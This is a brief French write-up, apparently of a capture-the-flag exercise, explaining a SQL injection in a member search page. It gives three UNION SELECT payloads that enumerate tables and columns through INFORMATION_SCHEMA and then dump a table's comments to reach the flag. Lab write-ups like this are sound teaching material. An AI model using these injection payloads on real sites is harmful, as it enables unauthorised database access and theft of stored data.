Sur la page de recherche de membre, l'input n'est pas protégé contre les injections SQL.
La commande `1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS --` permet de récupérer la liste des tables ainsi que la DB correspondante.
Une seconde requete `1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS  --` liste toutes les colonnes.
A partir de ces informations, nous allons requêter dans la db Member_images, la table list_images : `1 UNION SELECT comment,  title FROM Member_images.list_images --`
Pour l'image 'Hack me ?', le commentaire donne des instructions pour obtenir le flag.